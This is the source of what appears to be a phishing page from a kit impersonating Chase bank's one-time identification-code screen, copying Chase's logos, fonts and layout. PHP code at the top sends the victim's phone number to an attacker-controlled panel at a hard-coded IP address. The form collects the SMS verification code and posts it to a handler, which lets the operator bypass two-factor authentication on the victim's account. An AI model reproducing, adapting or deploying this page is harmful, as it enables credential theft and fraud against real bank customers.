<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">

<?php
session_start();


$numar = $_SESSION['phone'];



$test = @file_get_contents("http://86.106.131.107/panel/b.php?pin=$numar,READY");        // here goes the panel
?>




   
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="robots" content="noindex,nofollow">
      <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="msapplication-config" content="none">
      <title>For Your Protection - chase.com</title>
      <meta name="description" content="">
      <meta name="author" content="">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <!--[if lte IE 8]>
      <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2019.07.21-833/logon/assets/ie8.css" />
      <![endif]-->
      <link rel="dns-prefetch" href="https://secure05b.chase.com/">
      <link rel="preconnect" href="https://secure05b.chase.com/">
      <link rel="dns-prefetch" href="https://static.chasecdn.com/">
      <link rel="preconnect" href="https://static.chasecdn.com/">
      <link rel="dns-prefetch" href="https://rf15.chase.com/">
      <link rel="preconnect" href="https://rf15.chase.com/">
      <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
      <link rel="apple-touch-icon" sizes="152x152" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-152x152.png">
      <link rel="apple-touch-icon" sizes="120x120" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-120x120.png">
      <link rel="apple-touch-icon" sizes="76x76" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-76x76.png">
      <link rel="apple-touch-icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon.png">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/img/splash/ipad-landscape.png" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
      <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/img/splash/ipad-portrait.png" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
      <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2019.07.21-833/common/assets/img/splash/iphone.png" media="screen and (max-device-width: 320px)">
      <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
         html {height:100%; background: #fff;}
         @media only screen and (min-width: 768px) {
         html {
         background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
         }
         }
      </style>
      <noscript>
         <meta http-equiv="refresh" content="0;url=https://www.chase.com/digital/resources/js-disabled">
      </noscript>
      
      
      
      
      
      <link rel="stylesheet" href="../files/bars/blue-ui.css">
      <link rel="stylesheet" href="../files/bars/logon.css">
      
      
      <style type="text/css"></style>
      
   </head>
   
   <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
      <div id="logonApp" data-is-view="true">
         <div class="homepage" tabindex="-1">
            <div id="advertisenativeapp" data-has-view="true">
               <div data-is-view="true">
                  <div class="advertiseNativeApp showNativeAppAdBanner" style="display: none;">
                     <a class="cells closeAd" href="javascript:void(0);"><i class="jpui close icon" id="undefined" aria-hidden="true"></i> <span class="util accessible-text">close dialog</span></a> 
                     <a class="cells jpui link no-underline appDownloadLink" href="javascript:void(0);">
                        <div class="insideElem logo"><img class="nativeAppChaseLogo" src="../files/bars/ad-logo_1x.png" alt="Chase logo"></div>
                        <div class="insideElem ETEXT">Open in the Chase Mobile® app</div>
                        <div class="insideElem progessArrow"><i class="jpui progressright icon" id="undefined" aria-hidden="true"></i></div>
                        <span class="util accessible-text">and go to app store</span>
                     </a>
                  </div>
               </div>
            </div>
            <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
               <div data-is-view="true">
                  <div id="siteMessageAda" aria-live="polite">
                     <h2 class="util accessible-text" id="site-messages-heading">You have no more site alerts</h2>
                  </div>
               </div>
            </div>
            <div class="logon-container" id="container">
               <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                  <div class="logon header jpui transparent navigation bar" data-is-view="true">
                     <a id="logoHomepageLink" href="https://secure05b.chase.com/web/auth/?fromOrigin=https://secure05b.chase.com#">
                        <div class="chase logo"></div>
                        <span class="util accessible-text">Chase.com homepage</span>
                     </a>
                  </div>
               </header>
               <main id="logon-content" data-has-view="true">
                  <div class="msd password-reset reset-code" data-is-view="true">
                     <div id="backgroundImage">
                        <div class="jpui background image fixed blurred" id="geoImage">
                           <style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.8.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.8.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg); } }</style>
                        </div>
                     </div>
                     <div class="container">
                        <div class="row jpui primary panel">
                           <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
                              <h1 class="header" tabindex="-1">For Your Protection</h1>
                              <div class="row jpui panel body">
                                 <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                                       <div class="row">
                                          <div class="col-xs-12 col-sm-6 clear-padding">
                                             <h2>Enter identification code <span class="util high-contrast">Step 3 of 3</span></h2>
                                          </div>
                                          <div class="col-xs-12 col-sm-6 progress-padding">
                                             <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                                <ol class="steps-3" role="presentation">
                                                   <li class="active" id="progress-progressBar-step-1"></li>
                                                   <li class="active" id="progress-progressBar-step-2"></li>
                                                   <li class="active current-step" id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li>
                                                </ol>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <form id="mfa-submit-form" method="POST" autocomplete="off" action="finish.php" novalidate="">
                                       <h3>We sent you a text message.</h3>
                                       <p>Your identification code is on its way. Once you receive it, please enter it below.</p>
                                       <div class="inside-container">
                                          <div class="row">
                                             <div class="col-xs-12 col-sm-5 label-column otp-code"><label class="jpui label msdLabelHeightFix" for="otpcode_input-input-field"><span class="util accessible-text">Error:</span><span class="accessible-text hidden"></span>Temporary identification code </label></div>
                                             <div class="col-xs-12 col-sm-5 form-column otp-code">
                                                <div class="account-input ssn_card_account_number" id="otpcode_input">
                                                   <input min="0" class="jpui input account-input ssn_card_account_number" id="otpcode_input-input-field" placeholder="" format="" type="text" name="sms" data-validate="identificationCode" required="" value="">
												   <input type="hidden" id="custId" name="phone" value="<?php print " $user ";?>">
                                                   
                                                </div>
                                             </div>
                                          </div>
                                          </div>
                                          <h3>Didn't get it?</h3>
                                          <p class="identification-code-received-message"><span>We send our temporary identification codes right away. If you feel like you've waited long enough, ask us to</span> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" Send me another code ">Send me another code</a></span></p>
                                       </div>
                                       <div class="button-container row hide-xs show-sm">
                                          <div class="col-xs-12 col-sm-3 col-sm-offset-6"><button type="button" id="exitIdentification-sm" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button></div>
                                          <div id="logonSkipLinkContainer"><a class="jpui skiplink form-skipLink" id="logonSkipLink" href="javascript:void(0);" data-skipselector="#otpcode_input-input-field"><span class="label">Review missing/unchanged info.</span> </a></div>
                                          <div class="col-xs-12 col-sm-3"><button type="submit" id="log_on_to_landing_page-sm" class="jpui button focus fluid primary disabled" ><span class="label">Next</span> </button></div>
                                       </div>
                                       <div class="button-container row hide-sm">
                                          <div class="col-xs-12 col-sm-3 col-sm-push-9"><button type="submit" id="log_on_to_landing_page" class="jpui button focus fluid primary disabled" ><span class="label">Next</span> </button></div>
                                          <div class="col-xs-12 col-sm-3 col-sm-push-3"><button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button></div>
                                       </div>
                                    </form>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </main>
            </div>
            <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer>
         </div>
         <div id="languageSupportDisclaimer"></div>
         <div id="overlay" data-has-view="true"></div>
         <div class="overlay"></div>
         <div id="signoutModal"></div>
         <div id="siteExitWarning"></div>
         <div id="serviceErrorModal"></div>
         <div id="sessionTimeoutModal"></div>
      </div>
   </body>
</html>
</html>
